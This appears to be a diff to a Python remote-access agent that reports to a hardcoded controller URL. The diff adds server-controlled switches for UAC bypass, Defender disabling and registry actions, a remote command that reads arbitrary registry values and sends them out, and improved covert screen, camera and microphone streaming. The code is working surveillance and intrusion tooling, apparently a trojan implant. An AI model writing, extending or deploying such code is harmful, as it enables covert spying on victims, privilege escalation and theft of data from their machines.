@@ -627,7 +627,7 @@ def setup_exit_handlers():
             pass
         finally:
             # Exit cleanly
-            sys.exit(0)
+            return
     
     # Register cleanup for normal exit
     atexit.register(cleanup_handler)
@@ -784,13 +784,13 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'https://neural-control-hub.onrender.com/',
-        'http://localhost:8080'
+        'https://neural-control-hub.onrender.com',
+        'http://localhost:3000'
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'https://neural-control-hub.onrender.com/'
+    return 'https://neural-control-hub.onrender.com'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -1548,6 +1548,17 @@ SCREEN_JPEG_QUALITY = 60
 CAPTURE_QUEUE_SIZE = 10
 ENCODE_QUEUE_SIZE = 10
 
+# Delta (tile-based) streaming parameters
+DELTA_STREAM_ENABLED = True
+STREAM_TILE_SIZE = 64
+DELTA_DIFF_THRESHOLD = 8  # per-pixel average difference threshold
+KEYFRAME_INTERVAL_SECONDS = 2.0
+ADAPTIVE_STATS_SCREEN = {
+    'ema_tiles': 0.0,
+    'tile_size': STREAM_TILE_SIZE,
+    'diff_threshold': DELTA_DIFF_THRESHOLD,
+}
+
 # Audio streaming variables
 AUDIO_STREAMING_ENABLED = False
 AUDIO_STREAM_THREADS = []
@@ -1573,7 +1584,7 @@ MIC_VOLUME = 1.0
 SYSTEM_VOLUME = 1.0
 NOISE_REDUCTION_ENABLED = False
 ECHO_CANCELLATION_ENABLED = False
-AUDIO_ENCODING_OPUS_ENABLED = False
+AUDIO_ENCODING_OPUS_ENABLED = True
 AUDIO_TEST_TONE_ON_START = os.environ.get('AUDIO_TEST_TONE_ON_START', '0') == '1'
 
 # Thread safety locks for start/stop functions
@@ -1769,6 +1780,8 @@ WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
 WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
 WEBRTC_SIGNALING_QUEUE = queue.Queue()
 WEBRTC_BANDWIDTH_TRACK = {}  # agent_id -> {'bytes': int, 'ts': float}
+WEBRTC_EVENT_LOOPS = {}  # agent_id -> asyncio.AbstractEventLoop
+WEBRTC_LOOP_THREADS = {}  # agent_id -> threading.Thread
 WEBRTC_ICE_SERVERS = [
     {"urls": ["stun:stun.l.google.com:19302"]},
     {"urls": ["stun:stun1.l.google.com:19302"]}
@@ -1817,6 +1830,44 @@ WEBRTC_CONFIG = {
         }
     }
 }
+
+# Helpers to manage per-agent asyncio loops for WebRTC (avoid cross-loop issues)
+def ensure_webrtc_loop(agent_id):
+    import threading
+    loop = WEBRTC_EVENT_LOOPS.get(agent_id)
+    if loop and not loop.is_closed():
+        return loop
+    loop = asyncio.new_event_loop()
+    WEBRTC_EVENT_LOOPS[agent_id] = loop
+    t = threading.Thread(target=loop.run_forever, name=f"webrtc-loop-{agent_id}", daemon=True)
+    WEBRTC_LOOP_THREADS[agent_id] = t
+    t.start()
+    return loop
+
+def run_webrtc_coro(agent_id, coro, timeout=None):
+    loop = ensure_webrtc_loop(agent_id)
+    fut = asyncio.run_coroutine_threadsafe(coro, loop)
+    return fut.result(timeout) if timeout else fut.result()
+
+def shutdown_webrtc_loop(agent_id):
+    loop = WEBRTC_EVENT_LOOPS.get(agent_id)
+    t = WEBRTC_LOOP_THREADS.get(agent_id)
+    if loop:
+        try:
+            loop.call_soon_threadsafe(loop.stop)
+        except Exception:
+            pass
+        try:
+            if t:
+                try:
+                    t.join(timeout=2.0)
+                except Exception:
+                    pass
+            loop.close()
+        except Exception:
+            pass
+    WEBRTC_EVENT_LOOPS.pop(agent_id, None)
+    WEBRTC_LOOP_THREADS.pop(agent_id, None)
 
 # Module availability flags (already set above based on actual imports - removing duplicates)
 
@@ -9532,6 +9583,7 @@ def camera_send_worker(agent_id):
     bytes_sent = 0
     start_time = time.time()
     last_stats_time = start_time
+    last_stats_emit = start_time
     
     # Bandwidth limit: 5 MB/s (instead of 16 MB/s)
     max_bytes_per_second = 5 * 1024 * 1024
@@ -9815,7 +9867,25 @@ def audio_encode_worker(agent_id):
                             encoded_data = pcm_data  # Fallback to PCM
                             continue
                         pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
-                        encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
+                        # Resample to 48k if needed for Opus 20ms frames
+                        try:
+                            sr = RATE if isinstance(RATE, int) else 44100
+                        except Exception:
+                            sr = 44100
+                        if sr != 48000:
+                            new_len = int(round(len(pcm_array) * 48000.0 / float(sr)))
+                            x = np.arange(len(pcm_array), dtype=np.float32)
+                            xp = np.linspace(0.0, float(len(pcm_array) - 1), new_len, dtype=np.float32)
+                            pcm_array = np.clip(np.interp(xp, x, pcm_array.astype(np.float32)), -32768, 32767).astype(np.int16)
+                            sr = 48000
+                        frame_size = 960  # 20ms at 48kHz
+                        if len(pcm_array) != frame_size:
+                            if len(pcm_array) > frame_size:
+                                pcm_array = pcm_array[:frame_size]
+                            else:
+                                pad = np.zeros(frame_size - len(pcm_array), dtype=np.int16)
+                                pcm_array = np.concatenate([pcm_array, pad])
+                        encoded_data = encoder.encode(pcm_array.tobytes(), frame_size)
                     except Exception as e:
                         log_message(f"Opus encoding error: {e}")
                         encoded_data = pcm_data  # Fallback to PCM
@@ -10126,7 +10196,8 @@ def start_audio_streaming(agent_id):
             if AIORTC_AVAILABLE and WEBRTC_ENABLED:
                 try:
                     # Use WebRTC audio streaming
-                    asyncio.create_task(start_webrtc_audio_streaming(agent_id))
+                    loop = ensure_webrtc_loop(agent_id)
+                    asyncio.run_coroutine_threadsafe(start_webrtc_audio_streaming(agent_id), loop)
                     log_message("Started WebRTC audio streaming (sub-second latency)")
                     emit_system_notification('success', 'Audio Stream Started', 'WebRTC audio streaming started successfully')
                     return
@@ -10412,6 +10483,22 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         async def on_icegatheringstatechange():
             log_message(f"ICE gathering state: {pc.iceGatheringState} for agent {agent_id}")
         
+        @pc.on("icecandidate")
+        def on_icecandidate(candidate):
+            try:
+                if not candidate:
+                    return
+                safe_emit('webrtc_ice_candidate', {
+                    'agent_id': agent_id,
+                    'candidate': {
+                        'candidate': candidate.candidate,
+                        'sdpMid': candidate.sdpMid,
+                        'sdpMLineIndex': candidate.sdpMLineIndex
+                    }
+                })
+            except Exception as e:
+                log_message(f"Error sending ICE candidate: {e}", "error")
+        
         log_message(f"WebRTC peer connection created successfully for agent {agent_id}")
         return pc
         
@@ -10536,30 +10623,25 @@ def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enab
         if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
             log_message("Cannot start WebRTC streaming: Socket.IO is not connected", "warning")
             return False
-        # Create WebRTC peer connection
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
+        loop = ensure_webrtc_loop(agent_id)
         async def setup_webrtc():
             pc = await create_webrtc_peer_connection(agent_id, enable_screen, enable_audio, enable_camera)
-            if pc:
-                offer = await create_webrtc_offer(agent_id)
-                if offer:
-                    # Send offer to controller via Socket.IO
-                    if SOCKETIO_AVAILABLE:
-                        safe_emit('webrtc_offer', {  # [ OK ] SAFE
-                            'agent_id': agent_id,
-                            'offer_sdp': offer.sdp,
-                            'enable_screen': enable_screen,
-                            'enable_audio': enable_audio,
-                            'enable_camera': enable_camera
-                        })
-                        log_message(f"WebRTC offer sent to controller for agent {agent_id}")
-                        return True
-        
-        # Run WebRTC setup
-        result = loop.run_until_complete(setup_webrtc())
-        loop.close()
+            if not pc:
+                return False
+            offer = await create_webrtc_offer(agent_id)
+            if not offer:
+                return False
+            if SOCKETIO_AVAILABLE:
+                safe_emit('webrtc_offer', {
+                    'agent_id': agent_id,
+                    'offer_sdp': offer.sdp,
+                    'enable_screen': enable_screen,
+                    'enable_audio': enable_audio,
+                    'enable_camera': enable_camera
+                })
+                log_message(f"WebRTC offer sent to controller for agent {agent_id}")
+            return True
+        result = run_webrtc_coro(agent_id, setup_webrtc())
         
         if result:
             WEBRTC_ENABLED = True
@@ -10581,15 +10663,7 @@ def stop_webrtc_streaming(agent_id):
         return False
     
     try:
-        # Close WebRTC connection
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        async def cleanup_webrtc():
-            return await close_webrtc_connection(agent_id)
-        
-        result = loop.run_until_complete(cleanup_webrtc())
-        loop.close()
+        result = run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
         
         if result:
             WEBRTC_ENABLED = False
@@ -10598,6 +10672,7 @@ def stop_webrtc_streaming(agent_id):
             except Exception:
                 pass
             log_message(f"WebRTC streaming stopped for agent {agent_id}")
+            shutdown_webrtc_loop(agent_id)
             return True
         else:
             log_message(f"Failed to stop WebRTC streaming for agent {agent_id}", "error")
@@ -10856,7 +10931,10 @@ def automatic_reconnection_logic(agent_id):
             log_message(f"WebRTC connection failed for agent {agent_id}, attempting reconnection...")
             
             # Close failed connection
-            asyncio.create_task(close_webrtc_connection(agent_id))
+            try:
+                run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
+            except Exception as e:
+                log_message(f"Error scheduling WebRTC close on loop: {e}", "warning")
             
             # Wait a bit before reconnecting
             time.sleep(2)
@@ -11151,9 +11229,11 @@ def start_webrtc_audio_streaming(agent_id):
     
     try:
         # Create WebRTC peer connection with audio track
-        asyncio.create_task(create_webrtc_peer_connection(
-            agent_id, enable_screen=False, enable_audio=True, enable_camera=False
-        ))
+        loop = ensure_webrtc_loop(agent_id)
+        asyncio.run_coroutine_threadsafe(
+            create_webrtc_peer_connection(agent_id, enable_screen=False, enable_audio=True, enable_camera=False),
+            loop
+        )
         
         # Store stream info
         WEBRTC_STREAMS[agent_id] = {
@@ -11180,9 +11260,11 @@ def start_webrtc_camera_streaming(agent_id):
     
     try:
         # Create WebRTC peer connection with camera track
-        asyncio.create_task(create_webrtc_peer_connection(
-            agent_id, enable_screen=False, enable_audio=True, enable_camera=True
-        ))
+        loop = ensure_webrtc_loop(agent_id)
+        asyncio.run_coroutine_threadsafe(
+            create_webrtc_peer_connection(agent_id, enable_screen=False, enable_audio=True, enable_camera=True),
+            loop
+        )
         
         # Store stream info
         WEBRTC_STREAMS[agent_id] = {
@@ -11244,7 +11326,10 @@ def stop_webrtc_streaming_by_type(agent_id, stream_type=None):
     try:
         if stream_type is None or WEBRTC_STREAMS[agent_id]['type'] == stream_type:
             # Close WebRTC connection
-            asyncio.create_task(close_webrtc_connection(agent_id))
+            try:
+                run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
+            except Exception as e:
+                log_message(f"Error scheduling WebRTC close on loop: {e}", "warning")
             
             # Remove from tracking
             if agent_id in WEBRTC_STREAMS:
@@ -12767,22 +12852,42 @@ def on_config_update(data):
         agent = data.get('agent') or {}
         bypasses = data.get('bypasses') or {}
         registry = data.get('registry') or {}
-        global MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
-        MAX_PROMPT_ATTEMPTS = None
-        UAC_BYPASS_DEBUG_MODE = False
-        PERSISTENT_ADMIN_PROMPT_ENABLED = False
-        DEFENDER_DISABLE_ENABLED = False
-        REGISTRY_ENABLED = False
-        DISABLE_UAC_BYPASS = True
-        DISABLE_SLUI_BYPASS = True
+        global MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS, BYPASSES_ENABLED
         try:
-            for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
-                UAC_BYPASS_METHODS_ENABLED[k] = False
+            mp = agent.get('maxPromptAttempts')
+            if isinstance(mp, int):
+                MAX_PROMPT_ATTEMPTS = mp
         except Exception:
             pass
         try:
-            for k in list(REGISTRY_ACTIONS.keys()):
-                REGISTRY_ACTIONS[k] = False
+            UAC_BYPASS_DEBUG_MODE = bool(agent.get('uacBypassDebug', UAC_BYPASS_DEBUG_MODE))
+        except Exception:
+            pass
+        try:
+            PERSISTENT_ADMIN_PROMPT_ENABLED = bool(agent.get('persistentAdminPrompt', PERSISTENT_ADMIN_PROMPT_ENABLED))
+        except Exception:
+            pass
+        try:
+            BYPASSES_ENABLED = bool(bypasses.get('enabled', BYPASSES_ENABLED))
+            DISABLE_UAC_BYPASS = not BYPASSES_ENABLED
+        except Exception:
+            pass
+        try:
+            methods = bypasses.get('methods') or {}
+            if isinstance(methods, dict):
+                for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
+                    UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k, UAC_BYPASS_METHODS_ENABLED[k]))
+        except Exception:
+            pass
+        try:
+            REGISTRY_ENABLED = bool(registry.get('enabled', REGISTRY_ENABLED))
+        except Exception:
+            pass
+        try:
+            actions = registry.get('actions') or {}
+            if isinstance(actions, dict):
+                for k in list(REGISTRY_ACTIONS.keys()):
+                    REGISTRY_ACTIONS[k] = bool(actions.get(k, REGISTRY_ACTIONS[k]))
         except Exception:
             pass
     except Exception:
@@ -15460,11 +15565,14 @@ def on_start_stream(data):
 
 def on_set_stream_params(data):
     try:
-        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS
+        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD
         t = str(data.get('type', 'screen') or 'screen').lower()
         fps = data.get('fps')
         width = data.get('max_width')
         quality = data.get('jpeg_quality')
+        delta = data.get('delta')
+        tile_size = data.get('tile_size')
+        diff_threshold = data.get('diff_threshold')
         if t == 'screen':
             if isinstance(fps, (int, float)) and fps > 0:
                 TARGET_FPS = int(fps)
@@ -15472,6 +15580,12 @@ def on_set_stream_params(data):
                 SCREEN_MAX_WIDTH = int(width)
             if isinstance(quality, (int, float)) and 1 <= int(quality) <= 100:
                 SCREEN_JPEG_QUALITY = int(quality)
+            if isinstance(delta, bool):
+                DELTA_STREAM_ENABLED = delta
+            if isinstance(tile_size, (int, float)) and int(tile_size) >= 16:
+                STREAM_TILE_SIZE = int(tile_size)
+            if isinstance(diff_threshold, (int, float)) and int(diff_threshold) >= 1:
+                DELTA_DIFF_THRESHOLD = int(diff_threshold)
             safe_emit('agent_notification', {'type': 'info', 'title': 'Screen Params Updated', 'message': f'FPS={TARGET_FPS}, max_width={SCREEN_MAX_WIDTH}, quality={SCREEN_JPEG_QUALITY}'})
         elif t == 'camera':
             if isinstance(fps, (int, float)) and fps > 0:
@@ -16026,6 +16140,90 @@ def on_execute_command(data):
         except Exception as e:
             log_message(f"[EXECUTE_COMMAND] UAC test dispatch error: {e}", "error")
             pass
+        try:
+            if command.startswith("check-registry"):
+                payload = command[len("check-registry"):].strip()
+                items = None
+                if payload.startswith(":") or payload.startswith(" "):
+                    payload = payload[1:].strip()
+                try:
+                    items = json.loads(payload)
+                except Exception:
+                    try:
+                        import base64
+                        decoded = base64.b64decode(payload)
+                        items = json.loads(decoded.decode('utf-8', errors='ignore'))
+                    except Exception:
+                        items = []
+                results = []
+                try:
+                    import winreg
+                    hive_map = {
+                        'HKLM': winreg.HKEY_LOCAL_MACHINE,
+                        'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
+                        'HKCU': winreg.HKEY_CURRENT_USER,
+                        'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
+                        'HKCR': winreg.HKEY_CLASSES_ROOT,
+                        'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
+                        'HKU': winreg.HKEY_USERS,
+                        'HKEY_USERS': winreg.HKEY_USERS,
+                        'HKCC': winreg.HKEY_CURRENT_CONFIG,
+                        'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
+                    }
+                    for item in (items or []):
+                        hive_name = str(item.get('hive') or '').strip()
+                        path = str(item.get('path') or '').strip()
+                        name = str(item.get('key') or '').strip()
+                        ok_path = False
+                        ok_value = False
+                        value = None
+                        hive = hive_map.get(hive_name.upper())
+                        if hive is not None and path:
+                            try:
+                                k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
+                                ok_path = True
+                                if name:
+                                    try:
+                                        v, _t = winreg.QueryValueEx(k, name)
+                                        ok_value = True
+                                        value = v
+                                    except Exception:
+                                        ok_value = False
+                                winreg.CloseKey(k)
+                            except Exception:
+                                ok_path = False
+                        result_id = str(item.get('id') or (path + ("\\" + name if name else "")))
+                        results.append({
+                            'id': result_id,
+                            'hive': hive_name,
+                            'path': path,
+                            'key': name,
+                            'exists_path': ok_path,
+                            'exists_value': ok_value,
+                            'present': bool(ok_value or (ok_path and not name)),
+                            'value': value
+                        })
+                except Exception:
+                    results = []
+                safe_emit('registry_presence', {
+                    'agent_id': our_agent_id,
+                    'items': results
+                })
+                output = json.dumps({'count': len(results)}, separators=(',', ':'), ensure_ascii=True)
+                success = True
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id,
+                    'execution_id': execution_id,
+                    'command': command,
+                    'output': output,
+                    'success': success,
+                    'terminal_type': 'legacy',
+                    'prompt': get_powershell_prompt(),
+                    'timestamp': int(time.time() * 1000)
+                })
+                return
+        except Exception:
+            pass
         internal_commands = {
             "start-stream": lambda: start_streaming(our_agent_id),
             "stop-stream": stop_streaming,
@@ -16489,7 +16687,8 @@ def on_webrtc_answer(data):
         
         if AIORTC_AVAILABLE:
             # Handle the answer asynchronously
-            asyncio.create_task(handle_webrtc_answer(agent_id, answer_sdp))
+            loop = ensure_webrtc_loop(agent_id)
+            asyncio.run_coroutine_threadsafe(handle_webrtc_answer(agent_id, answer_sdp), loop)
             safe_emit('webrtc_answer_received', {'agent_id': agent_id})
         else:
             log_message("WebRTC not available, cannot handle answer", "warning")
@@ -16516,7 +16715,8 @@ def on_webrtc_ice_candidate(data):
         
         if AIORTC_AVAILABLE:
             # Handle the ICE candidate asynchronously
-            asyncio.create_task(handle_webrtc_ice_candidate(agent_id, candidate_data))
+            loop = ensure_webrtc_loop(agent_id)
+            asyncio.run_coroutine_threadsafe(handle_webrtc_ice_candidate(agent_id, candidate_data), loop)
         else:
             log_message("WebRTC not available, cannot handle ICE candidate", "warning")
             
@@ -18991,7 +19191,11 @@ def agent_main():
                         time.sleep(retry_delay)
                         continue
             
-                sio.connect(SERVER_URL, transports=['polling'], wait_timeout=10)
+                sio.connect(
+                    SERVER_URL,
+                    transports=['websocket', 'polling'],
+                    wait_timeout=30
+                )
                 log_message("[OK] Connected to server successfully!")
                 
                 # Reset connection attempts and state on successful connection
@@ -19477,95 +19681,119 @@ if __name__ == "__main__":
 
 def screen_capture_worker(agent_id):
     global STREAMING_ENABLED, capture_queue, SELECTED_MONITOR_INDEX, DISPLAY_MODE, PIP_MONITOR_INDEX
-    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
+    if not NUMPY_AVAILABLE or not CV2_AVAILABLE:
         log_message("Required modules not available for screen capture", "error")
         return
     try:
-        with mss.mss() as sct:
-            monitors = sct.monitors
-            monitor_index = SELECTED_MONITOR_INDEX if len(monitors) > 1 else 0
-            monitor = monitors[monitor_index]
-            # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
-            if isinstance(monitor, dict):
-                width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
-                height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
-            else:
-                # fallback tuple-style indexing
-                width = monitor[2] - monitor[0]
-                height = monitor[3] - monitor[1]
-            if width > 1280:
-                scale = 1280 / width
-                width = int(width * scale)
-                height = int(height * scale)
-            frame_time = 1.0 / TARGET_FPS
-            
+        hpc = HighPerformanceCapture(target_fps=TARGET_FPS, quality=85, enable_delta_compression=False)
+        sct = None
+        monitors = []
+        if MSS_AVAILABLE:
             try:
-                while STREAMING_ENABLED:
-                    try:
-                        start = time.time()
-                        if DISPLAY_MODE == 'combined' and len(monitors) > 1:
-                            frames = []
-                            for i in range(1, len(monitors)):
-                                m = monitors[i]
-                                s = sct.grab(m)
-                                f = np.array(s)
-                                if f.shape[2] == 4:
-                                    f = cv2.cvtColor(f, cv2.COLOR_BGRA2BGR)
-                                frames.append(f)
-                            if frames:
-                                try:
-                                    img = np.hstack(frames)
-                                except Exception:
-                                    img = frames[0]
-                        elif DISPLAY_MODE == 'pip' and len(monitors) > 1:
-                            base_m = monitors[monitor_index]
-                            pip_idx = PIP_MONITOR_INDEX if 1 <= PIP_MONITOR_INDEX < len(monitors) else 1
-                            pip_m = monitors[pip_idx]
-                            base_img = np.array(sct.grab(base_m))
-                            pip_img = np.array(sct.grab(pip_m))
-                            if base_img.shape[2] == 4:
-                                base_img = cv2.cvtColor(base_img, cv2.COLOR_BGRA2BGR)
-                            if pip_img.shape[2] == 4:
-                                pip_img = cv2.cvtColor(pip_img, cv2.COLOR_BGRA2BGR)
-                            pip_h = max(1, base_img.shape[0] // 4)
-                            pip_w = max(1, base_img.shape[1] // 4)
-                            pip_resized = cv2.resize(pip_img, (pip_w, pip_h), interpolation=cv2.INTER_AREA)
-                            x_off = max(0, base_img.shape[1] - pip_w - 10)
-                            y_off = max(0, base_img.shape[0] - pip_h - 10)
-                            img = base_img.copy()
+                sct = mss.mss()
+                monitors = sct.monitors
+            except Exception:
+                sct = None
+                monitors = []
+        monitor_index = SELECTED_MONITOR_INDEX if len(monitors) > 1 else 0
+        monitor = monitors[monitor_index] if monitors else None
+        if isinstance(monitor, dict):
+            width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
+            height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
+            left = int(monitor.get('left', 0))
+            top = int(monitor.get('top', 0))
+            right = left + width
+            bottom = top + height
+        elif monitor:
+            width = monitor[2] - monitor[0]
+            height = monitor[3] - monitor[1]
+            left = monitor[0]
+            top = monitor[1]
+            right = monitor[2]
+            bottom = monitor[3]
+        else:
+            width = 1280
+            height = 720
+            left = 0
+            top = 0
+            right = width
+            bottom = height
+        if width > 1280:
+            scale = 1280 / width
+            width = int(width * scale)
+            height = int(height * scale)
+        frame_time = 1.0 / TARGET_FPS
+        try:
+            while STREAMING_ENABLED:
+                try:
+                    start = time.time()
+                    if DISPLAY_MODE == 'combined' and len(monitors) > 1 and sct:
+                        frames = []
+                        for i in range(1, len(monitors)):
+                            m = monitors[i]
+                            s = sct.grab(m)
+                            f = np.array(s)
+                            if f.shape[2] == 4:
+                                f = cv2.cvtColor(f, cv2.COLOR_BGRA2BGR)
+                            frames.append(f)
+                        if frames:
                             try:
-                                img[y_off:y_off+pip_h, x_off:x_off+pip_w] = pip_resized
+                                img = np.hstack(frames)
                             except Exception:
-                                img = base_img
-                        else:
+                                img = frames[0]
+                    elif DISPLAY_MODE == 'pip' and len(monitors) > 1 and sct:
+                        base_m = monitors[monitor_index]
+                        pip_idx = PIP_MONITOR_INDEX if 1 <= PIP_MONITOR_INDEX < len(monitors) else 1
+                        pip_m = monitors[pip_idx]
+                        base_img = np.array(sct.grab(base_m))
+                        pip_img = np.array(sct.grab(pip_m))
+                        if base_img.shape[2] == 4:
+                            base_img = cv2.cvtColor(base_img, cv2.COLOR_BGRA2BGR)
+                        if pip_img.shape[2] == 4:
+                            pip_img = cv2.cvtColor(pip_img, cv2.COLOR_BGRA2BGR)
+                        pip_h = max(1, base_img.shape[0] // 4)
+                        pip_w = max(1, base_img.shape[1] // 4)
+                        pip_resized = cv2.resize(pip_img, (pip_w, pip_h), interpolation=cv2.INTER_AREA)
+                        x_off = max(0, base_img.shape[1] - pip_w - 10)
+                        y_off = max(0, base_img.shape[0] - pip_h - 10)
+                        img = base_img.copy()
+                        try:
+                            img[y_off:y_off+pip_h, x_off:x_off+pip_w] = pip_resized
+                        except Exception:
+                            img = base_img
+                    else:
+                        region = (left, top, right, bottom)
+                        frame = hpc.capture_frame(region=region) if hpc else None
+                        if frame is not None:
+                            img = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                        elif sct and monitor is not None:
                             sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
                             img = np.array(sct_img)
-                        if img.shape[1] != width or img.shape[0] != height:
-                            img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
-                        if img.shape[2] == 4:
-                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                        # Adaptive frame dropping - skip if queue too full
-                        queue_size = capture_queue.qsize()
-                        if queue_size < CAPTURE_QUEUE_SIZE:
-                            try:
-                                capture_queue.put_nowait(img)
-                            except queue.Full:
-                                pass  # Skip frame
                         else:
-                            # Queue full, skip this frame to prevent backlog
+                            img = np.zeros((height, width, 3), dtype=np.uint8)
+                    if img.shape[1] != width or img.shape[0] != height:
+                        img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+                    if img.shape[2] == 4:
+                        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                    queue_size = capture_queue.qsize()
+                    if queue_size < CAPTURE_QUEUE_SIZE:
+                        try:
+                            capture_queue.put_nowait(img)
+                        except queue.Full:
                             pass
-                        elapsed = time.time() - start
-                        sleep_time = max(0, frame_time - elapsed)
-                        if sleep_time > 0:
-                            time.sleep(sleep_time)
-                    except KeyboardInterrupt:
-                        log_message("Screen capture worker interrupted")
-                        break
-            except KeyboardInterrupt:
-                log_message("Screen capture worker interrupted")
+                    else:
+                        pass
+                    elapsed = time.time() - start
+                    sleep_time = max(0, frame_time - elapsed)
+                    if sleep_time > 0:
+                        time.sleep(sleep_time)
+                except KeyboardInterrupt:
+                    log_message("Screen capture worker interrupted")
+                    break
+        except KeyboardInterrupt:
+            log_message("Screen capture worker interrupted")
     except KeyboardInterrupt:
         log_message("Screen capture worker interrupted")
-    
     log_message("Screen capture stopped")
 
 def screen_encode_worker(agent_id):
@@ -19575,30 +19803,104 @@ def screen_encode_worker(agent_id):
         return
     
     try:
+        prev_gray = None
+        last_keyframe_ts = 0.0
+        tile_size = max(16, int(STREAM_TILE_SIZE))
+        diff_thresh = max(1, int(DELTA_DIFF_THRESHOLD))
+        frame_seq = 0
+        tile_jpeg_q = 50
+        ema_tiles = 0.0
         while STREAMING_ENABLED:
             try:
                 try:
                     img = capture_queue.get(timeout=0.5)
                 except queue.Empty:
                     continue
-                # H.264 encode (for now, JPEG fallback)
-                # Dynamic JPEG quality based on queue fullness
+                # If delta streaming disabled, send full-frame JPEG
+                if not DELTA_STREAM_ENABLED:
+                    queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
+                    jpeg_quality = 15 if queue_fullness <= 0.5 else 10
+                    is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
+                    if is_success:
+                        try:
+                            if encode_queue.full():
+                                encode_queue.get_nowait()
+                            frame_seq += 1
+                            encode_queue.put_nowait({'type': 'frame', 'frame_id': frame_seq, 'bytes': encoded.tobytes(), 'width': img.shape[1], 'height': img.shape[0]})
+                        except queue.Full:
+                            pass
+                    continue
+
+                # Delta (tile-based) encoding
+                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+                h, w = gray.shape[:2]
+                now_ts = time.time()
+                # Periodic keyframe to establish baseline
+                if prev_gray is None or (now_ts - last_keyframe_ts) >= KEYFRAME_INTERVAL_SECONDS:
+                    queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
+                    jpeg_quality = 20 if queue_fullness <= 0.5 else 12
+                    is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
+                    if is_success:
+                        try:
+                            if encode_queue.full():
+                                encode_queue.get_nowait()
+                            frame_seq += 1
+                            encode_queue.put_nowait({'type': 'keyframe', 'frame_id': frame_seq, 'bytes': encoded.tobytes(), 'width': w, 'height': h})
+                        except queue.Full:
+                            pass
+                        last_keyframe_ts = now_ts
+                    prev_gray = gray
+                    continue
+
+                # Compute changed tiles
+                dy = tile_size
+                dx = tile_size
+                # Absolute difference from previous gray
+                diff = cv2.absdiff(gray, prev_gray)
+                # For each tile, compute mean difference
+                frame_seq += 1
+                tiles_encoded = 0
+                grid_tiles = ((h + dy - 1) // dy) * ((w + dx - 1) // dx)
+                for y0 in range(0, h, dy):
+                    y1 = min(y0 + dy, h)
+                    for x0 in range(0, w, dx):
+                        x1 = min(x0 + dx, w)
+                        tile_diff = diff[y0:y1, x0:x1]
+                        mean_diff = float(np.mean(tile_diff))
+                        if mean_diff >= diff_thresh:
+                            tile_bgr = img[y0:y1, x0:x1]
+                            is_ok, enc = cv2.imencode('.jpg', tile_bgr, [cv2.IMWRITE_JPEG_QUALITY, tile_jpeg_q])
+                            if is_ok:
+                                try:
+                                    if encode_queue.full():
+                                        encode_queue.get_nowait()
+                                    encode_queue.put_nowait({'type': 'tile', 'frame_id': frame_seq, 'x': x0, 'y': y0, 'w': (x1 - x0), 'h': (y1 - y0), 'bytes': enc.tobytes()})
+                                    tiles_encoded += 1
+                                except queue.Full:
+                                    pass
                 queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
-                if queue_fullness > 0.8:
-                    jpeg_quality = 10  # Low quality when queue is full
-                elif queue_fullness > 0.5:
